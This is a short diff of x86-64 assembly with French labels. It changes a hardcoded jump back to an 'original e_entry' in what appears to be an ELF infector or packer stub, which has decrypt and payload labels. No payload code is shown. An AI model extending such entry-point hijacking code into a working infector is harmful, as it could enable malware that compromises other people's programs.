@@ -40,7 +40,7 @@ dechiffre:
 
     ; PÈRE : retour à e_entry original
 retour_pere:
-    mov     rax, 0x401050
+    mov     rax, 0x401000
     jmp     rax
 
 payload:
